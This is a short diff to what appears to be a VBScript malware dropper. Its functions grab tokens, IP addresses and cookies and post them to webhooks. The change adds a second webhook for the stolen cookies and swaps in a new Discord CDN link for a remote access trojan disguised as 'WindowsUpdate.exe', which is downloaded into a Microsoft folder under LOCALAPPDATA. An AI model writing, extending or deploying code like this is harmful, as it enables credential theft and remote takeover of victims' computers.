@@ -36,6 +36,7 @@ Do
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
+    Call PostCookieOnly(WH) ' <--- ADDED THIS LINE
     
     ' Only download RAT if it hasn't dropped successfully yet
     If Not ratDropped Then
@@ -50,7 +51,7 @@ window.close()
 ' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
     ' Updated RAT Link
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1573211629770772510/Winupdate.exe?ex=6b012f01&is=6affdd81&hm=a224ef4e41dca378740f95f58a8a0cdd5406aa60f24b376a510f101adcf83d9b&"
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
